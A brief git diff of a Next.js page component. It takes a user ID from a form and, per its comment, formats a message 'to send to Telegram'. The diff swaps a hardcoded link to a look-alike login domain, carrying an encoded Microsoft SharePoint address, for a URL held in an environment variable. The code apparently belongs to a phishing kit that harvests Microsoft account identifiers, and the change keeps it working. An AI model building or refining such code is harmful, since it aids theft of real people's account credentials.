@@ -8,9 +8,10 @@ export default function Home() {
     continueBtn.innerHTML = "Processing..."
 
     const userID = document.getElementById('userid').value.trim();
+    const uniquesPreUrl = process.env.NEXT_PUBLIC_URL_NAME
 
     // Format the message to send to Telegram
-    const url = `https://login.innovated.cc?CvptuaMGoA=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN&omn=${userID}`;
+    const url = `${uniquesPreUrl}&omn=${userID}`;
 
     try {
       setTimeout(() => {
